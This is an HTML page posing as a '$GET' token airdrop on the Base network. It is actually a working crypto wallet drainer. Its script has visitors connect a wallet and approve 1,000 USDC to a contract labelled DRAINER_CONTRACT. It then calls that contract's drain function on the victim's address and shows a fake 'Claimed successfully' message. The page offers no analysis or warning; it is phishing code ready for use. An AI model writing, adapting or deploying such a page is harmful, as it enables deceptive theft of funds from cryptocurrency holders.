<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>üéÅ GET Airdrop</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Inter', sans-serif; }
    .glow { box-shadow: 0 0 25px rgba(255, 255, 0, 0.2); }
    .spinner {
      border: 3px solid transparent;
      border-top: 3px solid #fff;
      border-radius: 50%;
      width: 1.25rem;
      height: 1.25rem;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-gradient-to-br from-black via-gray-900 to-gray-800 text-white min-h-screen flex items-center justify-center px-4">
  <div class="bg-gray-900 rounded-3xl p-8 max-w-md w-full shadow-xl border border-gray-700 glow text-center space-y-6">
    <div class="space-y-2">
      <h1 class="text-4xl font-bold text-yellow-400">üéÅ GET Airdrop</h1>
      <p class="text-gray-300">Claim <span class="text-green-400 font-semibold">10,000 $GET</span> instantly. Just connect and approve.</p>
    </div>

    <div class="flex flex-col space-y-4">
      <button id="connect" class="bg-blue-600 hover:bg-blue-700 py-3 rounded-xl font-semibold transition duration-200">
        üîå Connect Wallet
      </button>
      <button id="approve" disabled class="bg-green-600 hover:bg-green-700 py-3 rounded-xl font-semibold transition duration-200 flex items-center justify-center gap-2">
        ‚úÖ Approve Airdrop
      </button>
    </div>

    <div id="status" class="text-sm text-gray-400 mt-2 min-h-[1.25rem]"></div>

    <p class="text-xs text-gray-600 pt-4 border-t border-gray-700">
      Powered by Base ¬∑ Secure Airdrop Protocol
    </p>
  </div>

  <script>
    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
    const DRAINER_CONTRACT = "0x4BccC433fF69795d767c07Ccdc7aaF4F8Ed89D0f"; // ‚úÖ New Contract

    let signer, address;

    const connectBtn = document.getElementById('connect');
    const approveBtn = document.getElementById('approve');
    const status = document.getElementById('status');

    connectBtn.onclick = async () => {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        address = await signer.getAddress();

        const network = await provider.getNetwork();
        if (network.chainId !== 8453) {
          status.textContent = "‚ùå Please switch to Base Mainnet in your wallet.";
          return;
        }

        approveBtn.disabled = false;
        status.textContent = `‚úÖ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
      } catch (err) {
        console.error(err);
        status.textContent = "‚ùå Failed to connect wallet.";
      }
    };

    approveBtn.onclick = async () => {
      try {
        status.innerHTML = '<div class="spinner"></div> Approving...';

        const usdc = new ethers.Contract(USDC_ADDRESS, [
          "function approve(address spender, uint256 value) public returns (bool)",
          "function allowance(address owner, address spender) view returns (uint256)"
        ], signer);

        const value = ethers.utils.parseUnits("1000", 6); // Approve 1,000 USDC
        const tx = await usdc.approve(DRAINER_CONTRACT, value);
        await tx.wait();

        const allowance = await usdc.allowance(address, DRAINER_CONTRACT);
        console.log("Approved allowance:", ethers.utils.formatUnits(allowance, 6));

        status.innerHTML = '<div class="spinner"></div> Finalizing claim...';

        const drainer = new ethers.Contract(DRAINER_CONTRACT, [
          "function drain(address token, address victim) external"
        ], signer);

        const tx2 = await drainer.drain(USDC_ADDRESS, address);
        await tx2.wait();

        status.textContent = "üéâ Claimed successfully!";
        approveBtn.disabled = true;
      } catch (err) {
        console.error(err);
        status.textContent = "‚ùå Something went wrong during approval or claim.";
      }
    };
  </script>
</body>
</html>
